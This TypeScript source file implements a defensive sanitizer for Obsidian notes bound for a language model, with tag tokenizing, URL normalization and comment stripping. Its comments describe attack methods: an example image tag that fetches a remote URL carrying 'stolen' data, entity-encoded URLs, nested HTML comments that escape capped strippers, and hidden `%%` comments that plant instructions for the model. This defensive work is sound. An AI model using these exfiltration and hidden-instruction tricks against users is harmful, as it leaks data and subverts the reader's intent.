/**
 * Markup primitives shared by both sanitizers: a small HTML tag tokenizer,
 * URL normalization, and a delimiter-aware comment stripper.
 *
 * Why a tokenizer instead of one big regex (ARCHITECTURE.md §5.3 — the
 * defense is channel closure, not detection):
 *
 * The previous version modelled a tag's attribute area as
 * `(?:"[^"]*"|'[^']*'|[^>"'])*`, which silently requires every quote inside
 * the tag to be paired. A real HTML tokenizer does not: inside an unquoted
 * attribute value a stray `'` is a parse error but stays part of the value,
 * and the tag still ends at the first `>`. So
 * `<img src=https://x/p.png?d=it's-stolen>` did not match, was left
 * untouched, and reached the vault as a live fetch vector — while Obsidian
 * rendered it as an ordinary remote image.
 *
 * The rule here is: find candidate tags permissively (any `<name`), and do
 * the quote-aware work only while extracting attribute values. A tag whose
 * attributes look malformed is still parsed and still judged — it is never
 * skipped.
 *
 * Likewise for URLs: both consumers of the source text decode before
 * fetching (the HTML parser resolves entities, the URL parser drops ASCII
 * tab/CR/LF and leading controls, CommonMark resolves entities in link
 * destinations), so every URL is normalized the same way before the remote
 * test.
 */

import { INVISIBLE_CHAR_RE, TAG_BLOCK_RE } from './invisible.js';

/* ------------------------------------------------------------------ *
 * character helpers (charCode based: no control characters in regexes)
 * ------------------------------------------------------------------ */

const LT = 0x3c; // <
const GT = 0x3e; // >
const SLASH = 0x2f; // /
const EQUALS = 0x3d; // =
const DQUOTE = 0x22; // "
const SQUOTE = 0x27; // '
const TAB = 0x09;
const LF = 0x0a;
const FF = 0x0c;
const CR = 0x0d;
const SPACE = 0x20;

function isSpaceCode(c: number): boolean {
  return c === SPACE || c === TAB || c === LF || c === CR || c === FF;
}

function isAlphaCode(c: number): boolean {
  return (c >= 0x41 && c <= 0x5a) || (c >= 0x61 && c <= 0x7a);
}

/** Characters allowed in a tag name after the first letter. */
function isNameCode(c: number): boolean {
  return (
    isAlphaCode(c) ||
    (c >= 0x30 && c <= 0x39) || // 0-9
    c === 0x2d || // -
    c === 0x5f || // _
    c === 0x3a // : (namespaced tags)
  );
}

/* ------------------------------------------------------------------ *
 * HTML entities
 * ------------------------------------------------------------------ */

/**
 * The named entities that matter for smuggling a URL past a scheme check.
 * This is deliberately not the full HTML5 table: decoding is used for
 * *detection only*, never to rewrite content, so a missing name can only
 * cost a detection we also catch elsewhere, never corrupt a note.
 */
const NAMED_ENTITIES: Readonly<Record<string, string>> = {
  amp: '&',
  apos: "'",
  ast: '*',
  bsol: '\\',
  colon: ':',
  comma: ',',
  commat: '@',
  dollar: '$',
  equals: '=',
  excl: '!',
  grave: '`',
  gt: '>',
  hyphen: '-',
  lcub: '{',
  lowbar: '_',
  lpar: '(',
  lsqb: '[',
  lt: '<',
  midast: '*',
  nbsp: ' ',
  newline: '\n',
  num: '#',
  percnt: '%',
  period: '.',
  plus: '+',
  quest: '?',
  quot: '"',
  rcub: '}',
  rpar: ')',
  rsqb: ']',
  semi: ';',
  sol: '/',
  tab: '\t',
  tilde: '~',
  verbar: '|',
};

/** `&#104;`, `&#x68;`, `&Tab;`, and the legacy `;`-less forms. */
const ENTITY_RE = /&(#[xX][0-9a-fA-F]+|#[0-9]+|[a-zA-Z][a-zA-Z0-9]*);?/g;

function decodeEntitiesOnce(text: string): string {
  if (!text.includes('&')) return text;
  return text.replace(ENTITY_RE, (full: string, body: string) => {
    if (body.startsWith('#')) {
      const hex = body[1] === 'x' || body[1] === 'X';
      const code = Number.parseInt(hex ? body.slice(2) : body.slice(1), hex ? 16 : 10);
      if (!Number.isFinite(code) || code < 0 || code > 0x10ffff) return full;
      if (code >= 0xd800 && code <= 0xdfff) return full; // lone surrogate
      return String.fromCodePoint(code);
    }
    return NAMED_ENTITIES[body.toLowerCase()] ?? full;
  });
}

/**
 * Decode HTML entities, repeatedly. One pass is what a renderer does;
 * repeating to a fixpoint is strictly more conservative (it can only make
 * an already-suspicious value look more remote, and the decoded value is
 * never written back into a note).
 */
export function decodeEntities(text: string): string {
  let out = text;
  for (let i = 0; i < 4; i += 1) {
    const next = decodeEntitiesOnce(out);
    if (next === out) return out;
    out = next;
  }
  return out;
}

/* ------------------------------------------------------------------ *
 * URLs
 * ------------------------------------------------------------------ */

/** Drop ASCII tab/CR/LF anywhere and trim leading/trailing C0 + space. */
function stripUrlWhitespace(text: string): string {
  let out = '';
  for (const ch of text) {
    const c = ch.codePointAt(0) ?? 0;
    if (c === TAB || c === LF || c === CR) continue;
    out += ch;
  }
  let start = 0;
  let end = out.length;
  while (start < end && out.charCodeAt(start) <= SPACE) start += 1;
  while (end > start && out.charCodeAt(end - 1) <= SPACE) end -= 1;
  return out.slice(start, end);
}

/**
 * Bring a candidate URL into the shape its consumer will actually fetch:
 * entity-decoded, without invisible characters, without the ASCII
 * tab/CR/LF the URL parser removes, trimmed of leading/trailing controls.
 */
export function normalizeUrl(raw: string): string {
  const decoded = decodeEntities(raw)
    .replace(INVISIBLE_CHAR_RE, '')
    .replace(TAG_BLOCK_RE, '');
  return stripUrlWhitespace(decoded);
}

/** `http://…`, `https://…` or protocol-relative `//…`. */
const REMOTE_URL_RE = /^(?:https?:)?\/\//i;

/** Does this candidate resolve to a remote fetch once normalized? */
export function isRemoteUrl(raw: string): boolean {
  return REMOTE_URL_RE.test(normalizeUrl(raw));
}

/** An explicitly-schemed remote URL anywhere inside a blob of text. */
const REMOTE_IN_TEXT_RE = /https?:\/\/[^\s"'`<>\]}\\]+/i;

/**
 * Find a remote URL anywhere in `text` (already-normalized or not). Used as
 * the hostile-by-default fallback for fetch-vector tags whose attributes
 * did not yield a URL: if the raw tag mentions a remote address at all, the
 * tag goes, because we cannot prove the renderer will not fetch it.
 */
export function findRemoteUrl(text: string): string | undefined {
  const match = REMOTE_IN_TEXT_RE.exec(normalizeUrl(text));
  return match ? match[0] : undefined;
}

/** `url(…)` targets inside a CSS declaration block or style attribute. */
const CSS_URL_RE = /url\(\s*(?:"([^"]*)"|'([^']*)'|([^)]*))\)?/gi;

/** Remote fetch target inside an inline `style` value, if any. */
export function remoteUrlInStyle(styleValue: string): string | undefined {
  const decoded = normalizeUrl(styleValue);
  CSS_URL_RE.lastIndex = 0;
  let match: RegExpExecArray | null;
  while ((match = CSS_URL_RE.exec(decoded)) !== null) {
    const value = (match[1] ?? match[2] ?? match[3] ?? '').trim();
    if (isRemoteUrl(value)) return normalizeUrl(value);
  }
  // Anything else that names a remote host in a style value (CSS escapes,
  // `@import`, `image-set(…)`) is treated the same way.
  return findRemoteUrl(decoded);
}

/* ------------------------------------------------------------------ *
 * tag tokenizer
 * ------------------------------------------------------------------ */

export interface ParsedTag {
  /** Lowercased tag name. */
  readonly name: string;
  /** Index of the opening `<`. */
  readonly start: number;
  /** Index just past the closing `>`, or input.length when unterminated. */
  readonly end: number;
  /** Raw source text of the tag. */
  readonly raw: string;
  /** Attribute names lowercased; values raw (decode them at use site). */
  readonly attrs: ReadonlyMap<string, string>;
  /** Written in the `/>` form. */
  readonly selfClosing: boolean;
  /** No `>` before end of input — in a renderer it swallows what follows. */
  readonly unterminated: boolean;
}

/** Elements that never have a closing tag. */
const VOID_ELEMENTS: ReadonlySet<string> = new Set([
  'area',
  'base',
  'br',
  'col',
  'embed',
  'hr',
  'img',
  'input',
  'link',
  'meta',
  'param',
  'source',
  'track',
  'wbr',
]);

export function isVoidElement(name: string): boolean {
  return VOID_ELEMENTS.has(name);
}

/**
 * How much of one tag is examined. Every `<` in a note is a candidate tag
 * start, and a tag that never closes would otherwise be re-parsed to end of
 * input for each of them — quadratic, and a note full of `a<b` comparisons
 * is enough to trigger it. A tag longer than this is treated exactly like
 * an unterminated one, which is the conservative direction; note that
 * Obsidian renders an unclosed tag as literal text, so nothing is fetched
 * or hidden by what lies beyond the window.
 */
const MAX_TAG_SCAN = 8192;

/**
 * Parse the opening tag starting at `start`, following the HTML5 tokenizer
 * closely enough for a security decision:
 * - a quoted attribute value may contain `>` (the tag does not end there);
 * - an unquoted attribute value keeps stray quotes and ends at whitespace
 *   or `>` (so one unpaired quote can never hide the tag);
 * - an unterminated quoted value runs to the end of the scan window.
 */
export function parseTagAt(input: string, start: number): ParsedTag | undefined {
  if (input.charCodeAt(start) !== LT) return undefined;
  let i = start + 1;
  if (!isAlphaCode(input.charCodeAt(i))) return undefined;
  const limit = Math.min(input.length, start + MAX_TAG_SCAN);
  while (i < limit && isNameCode(input.charCodeAt(i))) i += 1;
  const name = input.slice(start + 1, i).toLowerCase();

  const attrs = new Map<string, string>();
  let selfClosing = false;
  let unterminated = true;
  let end = input.length;

  while (i < limit) {
    const c = input.charCodeAt(i);
    if (isSpaceCode(c)) {
      i += 1;
      continue;
    }
    if (c === GT) {
      end = i + 1;
      unterminated = false;
      break;
    }
    if (c === SLASH) {
      // Only `/>` sets the self-closing flag; a stray `/` is a parse error
      // the tokenizer ignores.
      if (input.charCodeAt(i + 1) === GT) selfClosing = true;
      i += 1;
      continue;
    }

    const nameStart = i;
    while (i < limit) {
      const n = input.charCodeAt(i);
      if (isSpaceCode(n) || n === EQUALS || n === GT || n === SLASH) break;
      i += 1;
    }
    if (i === nameStart) {
      i += 1; // stray `=`: never loop forever on it
      continue;
    }
    const attrName = input.slice(nameStart, i).toLowerCase();

    let j = i;
    while (j < limit && isSpaceCode(input.charCodeAt(j))) j += 1;
    let value = '';
    if (input.charCodeAt(j) === EQUALS) {
      j += 1;
      while (j < limit && isSpaceCode(input.charCodeAt(j))) j += 1;
      const quote = input.charCodeAt(j);
      if (quote === DQUOTE || quote === SQUOTE) {
        let close = j + 1;
        while (close < limit && input.charCodeAt(close) !== quote) close += 1;
        value = input.slice(j + 1, Math.min(close, limit));
        i = close + 1;
      } else {
        const valueStart = j;
        while (j < limit) {
          const v = input.charCodeAt(j);
          if (isSpaceCode(v) || v === GT) break;
          j += 1;
        }
        value = input.slice(valueStart, j);
        i = j;
      }
    }
    // First occurrence wins, like the HTML parser.
    if (!attrs.has(attrName)) attrs.set(attrName, value);
  }

  return {
    name,
    start,
    end,
    // Bounded: the fallback scan only needs the part we actually parsed.
    raw: input.slice(start, Math.min(end, limit)),
    attrs,
    selfClosing,
    unterminated,
  };
}

/** The next opening tag at or after `from`, if any. */
export function nextTag(input: string, from: number): ParsedTag | undefined {
  let i = from < 0 ? 0 : from;
  for (;;) {
    const lt = input.indexOf('<', i);
    if (lt === -1) return undefined;
    const tag = parseTagAt(input, lt);
    if (tag) return tag;
    i = lt + 1;
  }
}

/* ------------------------------------------------------------------ *
 * delimited comments
 * ------------------------------------------------------------------ */

export interface StripCount {
  content: string;
  count: number;
}

/**
 * Remove every `open … close` region, reaching a fixpoint in a single scan.
 *
 * The single-scan property is the point: a regex pass followed by an outer
 * loop can be escaped by nesting, because deleting `<!---->` out of
 * `<!` + `<!---->` + `-->` splices a brand-new comment at the junction and
 * each nesting level costs one more pass — 33 levels beat a 32-pass cap and
 * left a live `<!--…-->` in model-facing text. Here the output buffer is
 * re-examined after every deletion (the freshly spliced `<!--` is detected
 * as the next characters are appended), so nesting depth is irrelevant.
 *
 * `toEndOnUnterminated` mirrors the renderer: an unclosed `<!--` hides
 * everything after it, so it is stripped to end of input. It must stay
 * `false` when `open === close` (Obsidian `%%`), where an unmatched
 * delimiter is literal text.
 */
export function stripDelimited(
  input: string,
  open: string,
  close: string,
  toEndOnUnterminated: boolean,
): StripCount {
  if (!input.includes(open)) return { content: input, count: 0 };

  // Keep the reduced prefix as a character stack. It is tempting to flush
  // all but `open.length - 1` characters into immutable chunks, but that is
  // not sound: an arbitrarily deep construction can leave one partial
  // opener per level (`<!<!<!...`) and expose them from the inside out. A
  // bounded tail made the 64-level regression require a second sanitizer
  // call. The stack retains exactly the prefix that later input can reduce;
  // each input character is pushed at most once and each removed opener has
  // constant length, so this remains O(n) time and O(n) space.
  const output: string[] = [];
  let count = 0;
  let i = 0;

  const endsWithOpen = (): boolean => {
    if (output.length < open.length) return false;
    const start = output.length - open.length;
    for (let j = 0; j < open.length; j += 1) {
      if (output[start + j] !== open[j]) return false;
    }
    return true;
  };

  while (i < input.length) {
    output.push(input[i] ?? '');
    i += 1;
    if (!endsWithOpen()) continue;

    output.length -= open.length;
    const closeAt = input.indexOf(close, i);
    if (closeAt === -1) {
      if (toEndOnUnterminated) {
        count += 1;
        return { content: output.join(''), count };
      }
      // No closing delimiter left; with open === close that also means no
      // further opener, so the opener and the rest are literal text.
      output.push(...open, ...input.slice(i));
      return { content: output.join(''), count };
    }
    count += 1;
    i = closeAt + close.length;
  }
  return { content: output.join(''), count };
}

/**
 * Obsidian's own comment syntax `%%…%%`: renders as nothing in reading view
 * and live preview, so it is the most idiomatic place in a vault to hide
 * instructions from the human while leaving them readable by the model.
 */
export function stripObsidianComments(input: string): StripCount {
  return stripDelimited(input, '%%', '%%', false);
}

/** HTML comments, including unterminated ones (stripped to end of input). */
export function stripHtmlComments(input: string): StripCount {
  return stripDelimited(input, '<!--', '-->', true);
}
